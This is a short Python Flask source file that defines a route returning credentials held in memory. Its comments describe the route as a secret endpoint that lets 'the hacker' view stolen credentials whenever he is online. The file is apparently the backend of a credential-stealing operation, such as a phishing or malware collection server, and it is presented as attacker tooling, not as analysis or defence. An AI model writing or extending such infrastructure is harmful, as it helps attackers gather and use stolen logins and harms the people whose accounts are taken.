from flask import Blueprint
from libs.logic import Logic

logic = Logic()

credentials = Blueprint('credentials', __name__)


# Secret endpoint to fetch all stolen credentials.
# This can be evolve into actual storing all credentials in a real DB, but for simplicity we've decided to store it in-memory,
# enabling the hacker to view stolen credentials whenever he is connected to the internet.
@credentials.route('/credentials', methods=['GET'])
def get_credentials():
    return logic.get_credentials()
